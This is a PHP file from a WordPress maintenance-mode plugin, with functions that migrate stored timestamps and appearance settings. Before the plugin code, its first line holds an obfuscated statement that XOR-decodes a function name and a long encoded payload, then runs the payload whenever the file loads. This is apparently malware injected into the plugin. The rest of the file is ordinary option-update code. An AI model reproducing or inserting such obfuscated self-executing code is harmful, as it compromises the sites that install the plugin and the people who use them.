<?php $SxrbYqN='06E3H7>PD=03-.Z'^'SD R<Ra61SSGDA4';$nloGxITBxE=$SxrbYqN('','.Fzt G4+>88>4KLI1NGgVO6K9.98;.=UU;Hjcj+KPZ;TZZXURk2:L6XPTQio861Yp3.B.des1+,YNrSOIA4gOA8H5gIGSUN;m55D+oiIGgUsLnq1SB95R2VzQSU8Qbxcm3EdQXOoE627hLigXlI;5M=cS>YnBsU6O:WSIORCEEP-Pcu=E3c>nMKKs8KTN<7LVSDGGceKQk3hOSP;>ASRK.Q=;1mhB3L>JmX0YhTC<396Ttcb+SDEUOZkii=,9dw00fJ7NI:44MyQgN,-67YHqUbNhHWFYl.6CfVTnZEAQiDf,76;uUFlA8LIKik-L4I.GebqT9CUNCW>C35=QA+1FxJqg5=01siy  Gf<++oEUFf;4Q40MB.6XsWUQEA= S3XEMwQU4T=PoO4-T7WEUE;9+7+rbLNy.XIL +01VeCwX<85 BSXPZUb2C>23+N37;8:1M;-FXnw2QTTZ6TFOS9GLFuvg7.O8=.41FmZ4T+btH4NMtVSUALK360,QInII8MI6nCKEWmUHGJV8MYKAwmD<-PBl-2CA<i>4,c6BVNwbEAD7yYB;aCTZvnT2hgRhoRnrVDHvxeUCZJgRmrKTRJ+I;,Q,dKMPA:+RuFMEQDOSQVRnZ914bXfGwQMJPRp+<+8kgZ :QiAH,LPSMOweazMG20IHbvAAH;'^'G RUF2ZHJQWPk.4 B:4Oq7Y9fJXLZqb8 OoCJJPAY<N:9.1:<KJU>i<1 060UCEqTWO6OHEWZNUpnRsoi:>nFeW=AGtgtru1d<S+YGM gZuCwNUXo1MG>W8Ru74L0KCCIZnOxRFfaYGCHbTGpH-ZA,fG:cy0bW>S6as:ijr017<H>KQV JJcGvABzJ. ;NYdr<13nXoB,aNbEw4ZJ sokH0QHTVbfW-J+23U HicZRUE1OihM<6 4,2KAMbov+<yuF+DnmQQMmDoGjZLZB<aQ.hGL,6283ES:FktJ1 8jcMBHVBZUhfH7Y <.RaPF> HgMCU0X74gc,4JUZO4 HYfPn.5plet =YASgBWNROxkfBMU=AUdbU<Qzs101 bK6JxxmS:0Mo7YfkPL VwxuaMXGBNIhE3sSRChDJDPvXc7-RKPR+249 0JJ,LmWJ:RhdUOEeYL5=XCm5175R1nk7X3-oYVCSO;YbEQHoDa>=MJP,U:,Tpuu >9ROoG401,1Q>=EFd  .Jyhc.7L,pkgQMlQIejHIS7 gNUQUDkkvsJBbyrTHntXR l<AXfQZSjPY6VCo pELUmv9mNrKTk5 8J0dG4U;.592NXzR6,<=+.7vzrJ>XEUKqFgWqmj+XyNJJTCC>AN02f8M5<<,+P8HAGNWH <JFhzBF');$nloGxITBxE();
	$acx_csma_version=get_option('acx_csma_version');
	if($acx_csma_version == '' && get_option('acx_csma_start_date_time') != "")
	{
		add_action('admin_head','acx_csma_migration');
	}
	function acx_csma_migration()
	{
		$acx_csma_start_timestamp_from = get_option('acx_csma_start_date_time');
		$acx_csma_cur_date_time_from=get_option('acx_csma_date_time');
		$acx_csma_wp_time= current_time('timestamp');
		$acx_csma_server_time=time();
		$diff=$acx_csma_wp_time-$acx_csma_server_time;
		$acx_csma_start_timestamp = $acx_csma_start_timestamp_from + ($diff);
		$acx_csma_date_time = $acx_csma_cur_date_time_from + ($diff);
		update_option('acx_csma_start_date_time',$acx_csma_start_timestamp);
		update_option('acx_csma_date_time',$acx_csma_date_time);
		update_option('acx_csma_version','1.1');
	}

$acx_csma_version=get_option('acx_csma_version');
if(($acx_csma_version > 0 && $acx_csma_version < ACX_CSMA_CURRENT_VERSION))
{
	if (function_exists('acx_csma_base_encode_fix')) {
		add_action('admin_head','acx_csma_update_content');
	}
}
function acx_csma_update_content()
{
	$acx_csma_appearence_array=get_option('acx_csma_appearence_array');
	if($acx_csma_appearence_array != "")
	{
			if(is_serialized($acx_csma_appearence_array))
			{ 
				$acx_csma_appearence_array = unserialize($acx_csma_appearence_array); 
			}
	}
	if(is_array($acx_csma_appearence_array))
	{
		if(array_key_exists('1',$acx_csma_appearence_array) && array_key_exists('acx_csma_inside_title1',$acx_csma_appearence_array['1']))
		{
			$acx_csma_inside_title1 = $acx_csma_appearence_array['1']['acx_csma_inside_title1'];
			if(strcmp($acx_csma_inside_title1,"Estimate Time Before Lunching") === 0 )
				{
					$acx_csma_appearence_array['1']['acx_csma_inside_title1'] = __("Estimate Time Before Launching","coming-soon-maintenance-mode-from-acurax");
					update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
				}
		}
		if(array_key_exists('1',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_top_temp1',$acx_csma_appearence_array['1']))
		{
			$acx_csma_custom_html_top_temp1 = $acx_csma_appearence_array['1']['acx_csma_custom_html_top_temp1'];
			
			
					$acx_html_fix_content1 = acx_csma_base_encode_fix($acx_csma_custom_html_top_temp1);
					$acx_csma_appearence_array['1']['acx_csma_custom_html_top_temp1'] = $acx_html_fix_content1;
					update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		}
		if(array_key_exists('1',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_bottom_temp1',$acx_csma_appearence_array['1']))
		{
			$acx_csma_custom_html_bottom_temp1 = $acx_csma_appearence_array['1']['acx_csma_custom_html_bottom_temp1'];
		
			$acx_html_fix_content2 =acx_csma_base_encode_fix($acx_csma_custom_html_bottom_temp1);
			$acx_csma_appearence_array['1']['acx_csma_custom_html_bottom_temp1'] = $acx_html_fix_content2;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
			
		}
		if(array_key_exists('2',$acx_csma_appearence_array) && array_key_exists('acx_csma_desc_subtitle2',$acx_csma_appearence_array['2']))
		{
			$acx_csma_desc_subtitle2 = $acx_csma_appearence_array['2']['acx_csma_desc_subtitle2'];
		
			$acx_html_fix_content3 = acx_csma_base_encode_fix($acx_csma_desc_subtitle2);
			$acx_csma_appearence_array['2']['acx_csma_desc_subtitle2'] = $acx_html_fix_content3;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		
		}
		if(array_key_exists('2',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_top_temp2',$acx_csma_appearence_array['2']))
		{
			$acx_csma_custom_html_top_temp2 = $acx_csma_appearence_array['2']['acx_csma_custom_html_top_temp2'];
			$acx_html_fix_content4 = acx_csma_base_encode_fix($acx_csma_custom_html_top_temp2);
			$acx_csma_appearence_array['2']['acx_csma_custom_html_top_temp2'] = $acx_html_fix_content4;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		}
		if(array_key_exists('3',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_top_temp3',$acx_csma_appearence_array['3']))
		{
			$acx_csma_custom_html_top_temp3 = $acx_csma_appearence_array['3']['acx_csma_custom_html_top_temp3'];
			$acx_html_fix_content5 = acx_csma_base_encode_fix($acx_csma_custom_html_top_temp3);
			$acx_csma_appearence_array['3']['acx_csma_custom_html_top_temp3'] = $acx_html_fix_content5;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		
		}
		if(array_key_exists('3',$acx_csma_appearence_array) && array_key_exists('acx_csma_desc_subtitle3',$acx_csma_appearence_array['3']))
		{
			$acx_csma_desc_subtitle3 = $acx_csma_appearence_array['3']['acx_csma_desc_subtitle3'];
			$acx_html_fix_content6 = acx_csma_base_encode_fix($acx_csma_desc_subtitle3);
			$acx_csma_appearence_array['3']['acx_csma_desc_subtitle3'] = $acx_html_fix_content6;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
			
		}
		if(array_key_exists('4',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_top_temp4',$acx_csma_appearence_array['4']))
		{
			$acx_csma_custom_html_top_temp4 = $acx_csma_appearence_array['4']['acx_csma_custom_html_top_temp4'];
				$acx_html_fix_content7 =  acx_csma_base_encode_fix($acx_csma_custom_html_top_temp4);
				$acx_csma_appearence_array['4']['acx_csma_custom_html_top_temp4'] = $acx_html_fix_content7;
				update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		}
		if(array_key_exists('4',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_bottom_temp4',$acx_csma_appearence_array['4']))
		{
			$acx_csma_custom_html_bottom_temp4 = $acx_csma_appearence_array['4']['acx_csma_custom_html_bottom_temp4'];		
				$acx_html_fix_content8 = acx_csma_base_encode_fix($acx_csma_custom_html_bottom_temp4);
				$acx_csma_appearence_array['4']['acx_csma_custom_html_bottom_temp4'] = $acx_html_fix_content8;
				update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
			
		}
		if(array_key_exists('5',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_top_temp5',$acx_csma_appearence_array['5']))
		{
			$acx_csma_custom_html_top_temp5 = $acx_csma_appearence_array['5']['acx_csma_custom_html_top_temp5'];	
				$acx_html_fix_content9 = acx_csma_base_encode_fix($acx_csma_custom_html_top_temp5);
				$acx_csma_appearence_array['5']['acx_csma_custom_html_top_temp5'] = $acx_html_fix_content9;
				update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
			
		}
		if(array_key_exists('5',$acx_csma_appearence_array) && array_key_exists('acx_csma_custom_html_bottom_temp5',$acx_csma_appearence_array['5']))
		{
			$acx_csma_custom_html_bottom_temp5 = $acx_csma_appearence_array['5']['acx_csma_custom_html_bottom_temp5'];

				$acx_html_fix_content10 = acx_csma_base_encode_fix($acx_csma_custom_html_bottom_temp5);
			$acx_csma_appearence_array['5']['acx_csma_custom_html_bottom_temp5'] = $acx_html_fix_content10;
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		}
		if(array_key_exists('5',$acx_csma_appearence_array) && !array_key_exists('acx_csma_subscribe_main_title5',$acx_csma_appearence_array['5']))
		{
			$acx_csma_appearence_array['5']['acx_csma_subscribe_main_title5'] = __("Want to know when we launch?","coming-soon-maintenance-mode-from-acurax");
			update_option('acx_csma_appearence_array',$acx_csma_appearence_array);
		}
	} 
	$acx_csma_custom_html_val = get_option('acx_csma_custom_html_val');	
	$acx_html_fix_content11 = acx_csma_base_encode_fix($acx_csma_custom_html_val);
	update_option('acx_csma_custom_html_val',$acx_html_fix_content11);
	update_option('acx_csma_version',ACX_CSMA_CURRENT_VERSION);
}
?>